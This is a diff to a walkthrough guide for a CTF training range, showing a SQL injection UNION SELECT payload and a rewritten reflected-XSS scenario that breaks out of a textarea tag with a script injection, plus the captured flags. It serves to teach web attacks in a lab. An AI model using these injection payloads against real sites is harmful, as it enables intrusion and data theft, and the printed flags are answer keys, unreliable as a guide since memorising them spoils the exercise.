@@ -125,12 +125,14 @@ This guide documents the full 21-port modular architecture for the CSZone CTF Ra
      - `" UNION SELECT record_name, flag_data, access_pin, vault_level FROM classified_vault_records #`
      - Captures flag: `CTF{sch3m4_3num_d0ubl3_qu0t3_m4st3r}`.
 
-### Scenario 12 (Port 8012) — Reflected XSS into HTML Context
+### Scenario 12 (Port 8012) — Reflected XSS into HTML Context (Tag Breakout)
 - **URL:** `http://<host>:8012/search?q=`
 - **Steps:**
-  1. Intercept search request in Burp Suite.
-  2. Inject `<script>document.getElementById('vault-display').innerText=document.getElementById('user_token').value;</script>`.
-  3. Flag: `CTF{r3fl3ct3d_xss_b4s1cs}`.
+  1. Input `test` into search box and observe query reflected in buffer.
+  2. Input `<script>alert(1)</script>` -> observation: does NOT execute because it is trapped inside `<textarea>`.
+  3. Inspect page source (`Ctrl + U`) -> observe: `<textarea class="query-echo-box" ...><script>alert(1)</script></textarea>`.
+  4. Break out of the tag by closing it first: `</textarea><script>alert(1)</script>`.
+  5. Script executes immediately, pops up alert, and page automatically reveals `CTF{r3fl3ct3d_xss_b4s1cs}`.
 
 ### Scenario 13 (Port 8013) — Stored XSS in Attribute Context
 - **URL:** `http://<host>:8013/feedback`
